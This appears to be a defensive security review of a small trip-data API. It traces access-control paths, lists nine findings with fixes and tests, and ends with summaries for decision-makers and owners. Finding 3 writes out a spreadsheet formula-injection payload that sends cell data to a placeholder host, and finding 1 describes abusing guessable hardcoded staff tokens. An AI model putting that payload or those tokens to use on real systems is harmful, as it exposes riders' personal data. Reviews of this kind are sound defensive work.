# Adversarial Diagnostic Review: Pedalo ops API handlers

## Pass 1: Reconstruct

The work claims to put request handlers in front of an in-memory trip store:

- `/trips` returns the caller's own trips.
- `/staff/trips.json` and `/staff/trips.csv` dump every rider's trips, including names and emails, to staff only.
- A missing or unknown token gives 401, and a rider token on any `/staff/` path gives 403.

For this to be correct, all of the following must hold:

1. Authentication runs before any routing.
2. Every data-returning staff branch sits behind `require_staff`.
3. The identity returned by `auth.current` uniquely identifies a rider in the trip store.
4. Tokens are secret.
5. The CSV export faithfully represents the rows.

Unstated assumptions:

- Rider names are unique and are the join key between identity and trips.
- The hardcoded token table and in-memory data are placeholders and will not ship as is.
- Field values never contain commas, quotes, newlines or spreadsheet formula prefixes.

## Pass 2: Attack (Track B, plus the personal-data items from Track R)

**Authorization path, traced.**

- `token=None`: becomes `b""`, matches nothing, returns 401 (`app.py` first `try`).
- Token `""`, an int, or `"tök"`: also 401.
- Rider on `/staff/trips.json` or `/staff/trips.csv`: `require_staff` raises, returns 403.
- Rider on `/staff/anything`: 403.
- Staff on an unknown `/staff/x`: 404.
- Hostile paths such as `/trips/../staff/trips.json`, `/STAFF/trips.json` and `/staff/trips.json?x=1` fall through to 404. Data is returned only on exact string matches *after* the staff check, so none of these leak.
- No-token on `/staff/*` gives 401, because authentication runs before dispatch.

The core access-control logic holds.

## Verdict

**VERDICT: SHIP WITH FIXES.** The 401/403 gating is correct on every path I traced. However, hardcoded tokens, name-keyed rider identity and an unescaped CSV export of personal data must be fixed before production.

**CONFIDENCE IN VERDICT: medium.** I could not run the tests or mutations. I also cannot tell whether `auth.py` and `trips.py` are placeholders for real backends, and that changes findings 1 and 2 from "blocker" to "known stub".

## Findings

| # | Severity | Evidence | Location | What is wrong | Failure scenario | Fix or test |
|---|---|---|---|---|---|---|
| 1 | High | CONFIRMED | `auth.py`: `_TOKENS = {"tok-rita": ..., "tok-sam": ("sam","staff"), "tok-ola": ...}` | Static, guessable bearer tokens are committed in source. This includes two staff tokens that unlock the full personal-data dump. | Anyone with repo or artifact access, or anyone who guesses the `tok-<name>` pattern, sends `tok-sam` to `/staff/trips.csv` and downloads every rider's name and email. Tokens cannot be rotated or revoked without a code change. | Load tokens or their hashes from a secret store or identity provider. Store hashes, not raw tokens. Add a test asserting that no literal token exists in `auth.py` (or a secret-scan check in CI). |
| 2 | High | PROBABLE | `app.py`: `trips.for_rider(ident[0])`; `trips.py`: `t["rider"] == name` | A rider's "own" trips are selected by display name, not a unique rider ID. | Two riders both named "rita" (or a rider who registers with another rider's name) see each other's trips and emails through `/trips`. That is a cross-rider personal-data leak. | Key identity and trips on an immutable rider ID returned by `auth.current`. Add a test with two riders who share a name and assert that each sees only their own rows. |
| 3 | Medium | CONFIRMED (code) / PROBABLE (exploitability) | `trips.py` `as_csv`: `f"{t['rider']},{t['email']},..."` | There is no CSV quoting or escaping, and no defense against formula injection. | (a) A name such as `Smith, Jr.` or one containing a newline shifts columns, so emails land in the wrong column or rows split. (b) A rider-supplied name like `=HYPERLINK("http://x/?"&B2,"click")` executes when staff open the export in a spreadsheet, which can exfiltrate other riders' data. | Use `csv.writer` with `QUOTE_MINIMAL`. Prefix cells starting with `= + - @ \t \r` with `'`. Test a row containing a comma, a quote, a newline and a leading `=`. |
| 4 | Medium | CONFIRMED | `test_app.py` `test_staff_can_export_json` asserts only `status == 200` | The test does not check the body. | Mutation `all_rows = lambda: []`, or returning only the caller's rows, leaves this test green. A broken export ships undetected. | Assert that the body contains all 3 rows and includes `name`/`email` for `tomas`. Confirm the test goes red under that mutation. |
| 5 | Medium | CONFIRMED (absence) | `test_app.py`, whole file | The spec says explicitly that "No token gives 401" on `/staff` routes, but 401 is tested only on `/trips`. Mutation resistance of the other tests is also untested. | Someone reorders `handle` so that `/staff` dispatch runs before authentication, or treats `None` as a rider. Every current test still passes while unauthenticated `/staff/*` requests misbehave. | Add `get("/staff/trips.json", None)` and `get("/staff/trips.csv", None)` with expected status 401. Also add the rider-on-unknown-`/staff/x` → 403 case. |
| 6 | Medium | CONFIRMED (absence) | `app.py` staff branches | There is no audit record of who exported the bulk personal data, or when. | After a leak (see finding 1), nobody can determine which identity pulled the dump. | Log `(ident, path, timestamp, row_count)` on each staff export, with no row contents in the log. |
| 7 | Low | CONFIRMED | `app.py`: `request["path"]` | A missing `path` raises `KeyError` instead of returning a clean 4xx. | An authenticated request without a path produces an unhandled exception (500) and possibly a stack trace. | Use `request.get("path", "")`. |
| 8 | Low | CONFIRMED | `app.py`: `path.startswith("/staff/")` | Bare `/staff` (no trailing slash) returns 404 to a rider, not 403. The spec says "everything under /staff". | This leaks nothing, but it is inconsistent with the spec. | Use `path == "/staff" or path.startswith("/staff/")`. |
| 9 | Low | PROBABLE | `auth.py` `current` loop | The token check is a linear scan that returns early, so timing reveals which table position matched. `compare_digest` is also not constant-time across different lengths. | This is a minor side channel and is unlikely to be exploitable here. | Look up `sha256(token)` in a dict of hashed tokens. |

## What holds up

- Authentication runs before all routing, so unknown tokens and non-string tokens get 401 everywhere.
- Every data-returning staff branch is reachable only after `require_staff`. Path tricks fall to 404 rather than to data.
- `for_rider` and `all_rows` return copies (`dict(t)`), so callers cannot mutate the store.
- `test_rider_sees_only_their_own_trips` would catch the mutation `for_rider` → all rows, because tomas's row fails the `all(...)` check, and the `body and` guard catches an empty result.
- `compare_digest` is used correctly on bytes.

## Unverified claims

- **"7 tests in test_app.py pass."** There are 7 test methods, and tracing them by hand suggests they pass, but I did not run them. To confirm, run `python -m unittest test_app -v`.
- **Mutation resistance of the 403 tests.** To check it, change `require_staff` to a no-op and confirm that `test_rider_cannot_export_json` and `test_rider_cannot_export_csv` go red.
- **Whether `auth.py` and `trips.py` are what will actually run in production.**

## Questions for the author

1. Are `auth._TOKENS` and `trips._TRIPS` the production implementation, or stubs for a real identity provider and database? If they are stubs, findings 1 and 2 move to the integration layer, and the question is whether that layer keys on a unique ID.
2. Are rider names unique and immutable, and does the rider control their own name?
3. Will staff open the CSV export in a spreadsheet tool?

## Decision-maker summary

The 401/403 access control is correct. Before production, replace the hardcoded tokens with real secrets, key rider trips on a unique ID instead of a name, and generate the CSV with proper escaping. If you ship as is, anyone who knows or guesses a staff token can download every rider's name and email, and riders who share a name can see each other's trips.

## Owner summary

The rule that keeps riders out of the staff-only data works correctly. However, the passwords that unlock staff access are written directly into the code, riders are matched to their trips by name rather than by a unique identifier, and the spreadsheet export is not safely formatted. Each of these could expose customers' personal details and should be fixed before launch.

```json
{
  "verdict": "SHIP WITH FIXES",
  "findings": [
    {"severity": "High", "evidence_level": "CONFIRMED", "location": "auth.py _TOKENS", "scenario": "Static guessable staff tokens committed in source; anyone with repo access or who guesses tok-<name> calls /staff/trips.csv and downloads all rider names and emails; no rotation or revocation.", "fix": "Load hashed tokens from a secret store or IdP; secret-scan check in CI."},
    {"severity": "High", "evidence_level": "PROBABLE", "location": "app.py trips.for_rider(ident[0]); trips.py for_rider name match", "scenario": "Two riders sharing a display name see each other's trips and emails via /trips.", "fix": "Key identity and trips on a unique immutable rider ID; test two riders with the same name."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "trips.py as_csv f-string join", "scenario": "Comma, quote or newline in a name corrupts columns; a name starting with = runs as a formula when staff open the CSV, enabling exfiltration.", "fix": "Use csv.writer; prefix cells starting with = + - @ tab or CR with a quote; add a test with hostile values."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "test_app.py test_staff_can_export_json", "scenario": "Asserts status only; mutation all_rows -> [] still passes.", "fix": "Assert the full row set including tomas's name and email."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "test_app.py (missing tests)", "scenario": "No test for no-token on /staff routes despite the explicit spec; reordering auth after staff dispatch would go undetected.", "fix": "Add None-token tests on /staff/trips.json and /staff/trips.csv expecting 401, and rider on /staff/x expecting 403."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "app.py staff export branches", "scenario": "No audit trail of bulk personal-data exports; after a leak, the exporter cannot be identified.", "fix": "Log identity, path, time and row count (no row contents) per export."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "app.py request[\"path\"]", "scenario": "Authenticated request missing path raises KeyError (500).", "fix": "Use request.get(\"path\", \"\")."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "app.py path.startswith(\"/staff/\")", "scenario": "Rider on bare /staff gets 404, not 403 as the spec implies.", "fix": "Also match path == \"/staff\"."},
    {"severity": "Low", "evidence_level": "PROBABLE", "location": "auth.py current loop", "scenario": "Early-return linear scan and length-dependent compare give a minor timing side channel.", "fix": "Look up a hashed token in a dict."}
  ]
}
```